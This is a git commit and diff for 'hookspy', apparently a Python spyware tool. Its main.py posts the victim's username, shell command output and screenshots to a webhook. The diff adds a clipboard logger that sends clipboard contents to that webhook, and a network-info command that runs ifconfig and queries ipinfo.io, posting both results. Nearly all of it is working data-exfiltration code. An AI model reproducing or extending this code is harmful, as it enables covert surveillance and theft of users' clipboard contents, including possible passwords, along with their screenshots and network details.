683ed5f0eadeab17b9347a729f3a77479cc8481f
peanut <pnuthacking@gmail.com>
2026-06-21 22:14:35 +0200

    Implement clipboard logger and network info commands
    Added clipboard logging and network info retrieval options.

--- main.py
+++ main.py
@@ -1,7 +1,8 @@
 import os
 import requests
+import pyperclip
 
-WEBHOOK = "" #put your here
+WEBHOOK = "webhook" #put your here
 
 user = os.getlogin()
 requests.post(WEBHOOK, data={"content": f"```Logged in as {user}```"})  
@@ -11,9 +12,12 @@ cwd = os.getcwd()
 while True:
     print(f"""
     \n hookspy v0.1-alpha        https://github.com/realpnut/hookspy
+    0 - Exit
     1 - Shell
     2 - System Info
     3 - Screenshot
+    4 - Paperclip logger
+    5 - Network Info
     """)
     uput = input("Choose an option: ")
 
@@ -26,7 +30,7 @@ while True:
                     os.chdir(cmd[3:].strip())
                     cwd = os.getcwd()
                 except:
-                    print("cd error")
+                    print("blad cd")
                 continue
             out = os.popen(cmd).read()
             print(out)
@@ -41,3 +45,12 @@ while True:
             requests.post(WEBHOOK, data={"content": f"```Screenshotting...```"})
             requests.post(WEBHOOK, files={"file": f})
         os.system("rm /tmp/screenshot.png")
+    elif uput == "4":
+        text = pyperclip.paste()
+        print(f"Clipboard content: {text}")
+        requests.post(WEBHOOK, data={"content": f"```Clipboard content: {text}```"})
+    elif uput == "5":
+        out = os.popen("ifconfig").read()
+        requests.post(WEBHOOK, data={"content": f"```{out}```"})
+        out = os.popen("curl ipinfo.io").read()
+        requests.post(WEBHOOK, data={"content": f"```{out}```"})
